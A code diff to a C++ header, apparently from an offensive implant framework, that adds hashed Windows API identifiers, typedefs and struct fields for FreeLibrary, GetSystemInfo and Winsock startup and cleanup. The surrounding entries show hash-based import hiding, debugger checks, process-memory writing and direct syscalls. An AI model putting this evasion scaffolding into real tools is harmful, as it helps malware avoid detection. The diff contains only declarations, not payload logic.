@@ -88,10 +88,12 @@
 #define HASH_FUNC_ENUMPROCESSMODULES            0x5a9d078e
 #define HASH_FUNC_EXPANDENVIRONMENTSTRINGSW     0x30ae5619
 #define HASH_FUNC_FINDWINDOWW                   0x530252f9
+#define HASH_FUNC_FREELIBRARY                   0x26174ba
 #define HASH_FUNC_GETMODULEBASENAMEA            0x74fb798
 #define HASH_FUNC_GETMODULEHANDLEA              0xbf3b40ac
 #define HASH_FUNC_GETPROCADDRESS                0xafa3e09d
 #define HASH_FUNC_GETSYSTEMDIRECTORYW           0x7115fb1a
+#define HASH_FUNC_GETSYSTEMINFO                 0x109fc03e
 #define HASH_FUNC_GETTHREADCONTEXT              0x749d3064
 #define HASH_FUNC_GETWINDOWTHREADPROCESSID      0x7fcdda0f
 #define HASH_FUNC_ISDEBUGGERPRESENT             0xef4ed1b
@@ -135,6 +137,8 @@
 #define HASH_FUNC_WINHTTPSETOPTION              0x48ed79a8
 #define HASH_FUNC_WINHTTPWRITEDATA              0xeed55fda
 #define HASH_FUNC_WRITEPROCESSMEMORY            0x9ea48f46
+#define HASH_FUNC_WSACLEANUP                    0xd1b44ef4
+#define HASH_FUNC_WSASTARTUP                    0xa548e84d
 
 namespace Procs
 {
@@ -276,6 +280,8 @@ namespace Procs
     typedef DWORD       (WINAPI* LPPROC_EXPANDENVIRONMENTSTRINGSW)(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
     // FindWindowW
     typedef HWND        (WINAPI* LPPROC_FINDWINDOWW)(LPCWSTR lpClassName, LPCWSTR lpWindowName);
+    // FreeLibrary
+    typedef BOOL        (WINAPI* LPPROC_FREELIBRARY)(HMODULE hLibModule);
     // GetModuleBaseNameA
     typedef DWORD       (WINAPI* LPPROC_GETMODULEBASENAMEA)(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize);
     // GetModuleHandleA
@@ -284,6 +290,8 @@ namespace Procs
     typedef FARPROC     (WINAPI* LPPROC_GETPROCADDRESS)(HMODULE hModule, LPCSTR lpProcName);
     // GetSystemDirectoryW
     typedef UINT        (WINAPI* LPPROC_GETSYSTEMDIRECTORYW)(LPWSTR lpBuffer, UINT uSize);
+    // GetSystemInfo
+    typedef VOID        (WINAPI* LPPROC_GETSYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
     // GetThreadContext
     typedef BOOL        (WINAPI* LPPROC_GETTHREADCONTEXT)(HANDLE hThread, LPCONTEXT lpContext);
     // GetWindowThreadProcessId
@@ -370,6 +378,10 @@ namespace Procs
     typedef BOOL        (WINAPI* LPPROC_WINHTTPWRITEDATA)(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);
     // WriteProcessMemory
     typedef BOOL        (WINAPI* LPPROC_WRITEPROCESSMEMORY)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+    // WSACleanup
+    typedef int         (WINAPI* LPPROC_WSACLEANUP)();
+    // WSAStartup
+    typedef int         (WINAPI* LPPROC_WSASTARTUP)(WORD wVersionRequired, LPWSADATA lpWSAData);
 
     struct PROCS
     {
@@ -441,10 +453,12 @@ namespace Procs
         LPPROC_ENUMPROCESSMODULES           lpEnumProcessModules                = nullptr;
         LPPROC_EXPANDENVIRONMENTSTRINGSW    lpExpandEnvironmentStringsW         = nullptr;
         LPPROC_FINDWINDOWW                  lpFindWindowW                       = nullptr;
+        LPPROC_FREELIBRARY                  lpFreeLibrary                       = nullptr;
         LPPROC_GETMODULEBASENAMEA           lpGetModuleBaseNameA                = nullptr;
         LPPROC_GETMODULEHANDLEA             lpGetModuleHandleA                  = nullptr;
         LPPROC_GETPROCADDRESS               lpGetProcAddress                    = nullptr;
         LPPROC_GETSYSTEMDIRECTORYW          lpGetSystemDirectoryW               = nullptr;
+        LPPROC_GETSYSTEMINFO                lpGetSystemInfo                     = nullptr;
         LPPROC_GETTHREADCONTEXT             lpGetThreadContext                  = nullptr;
         LPPROC_GETWINDOWTHREADPROCESSID     lpGetWindowThreadProcessId          = nullptr;
         LPPROC_ISDEBUGGERPRESENT            lpIsDebuggerPresent                 = nullptr;
@@ -488,6 +502,8 @@ namespace Procs
         LPPROC_WINHTTPSETOPTION             lpWinHttpSetOption                  = nullptr;
         LPPROC_WINHTTPWRITEDATA             lpWinHttpWriteData                  = nullptr;
         LPPROC_WRITEPROCESSMEMORY           lpWriteProcessMemory                = nullptr;
+        LPPROC_WSACLEANUP                   lpWSACleanup                        = nullptr;
+        LPPROC_WSASTARTUP                   lpWSAStartup                        = nullptr;
 
         // **SYSCALLS**
         Syscalls::SYSCALL                   sysLdrLoadDll                       = {0};
@@ -542,7 +558,8 @@ namespace Procs
         HMODULE hBcrypt,
         HMODULE hCrypt32,
         HMODULE hUser32,
-        HMODULE hWinHttp
+        HMODULE hWinHttp,
+        HMODULE hWs2_32
     );
 }
 
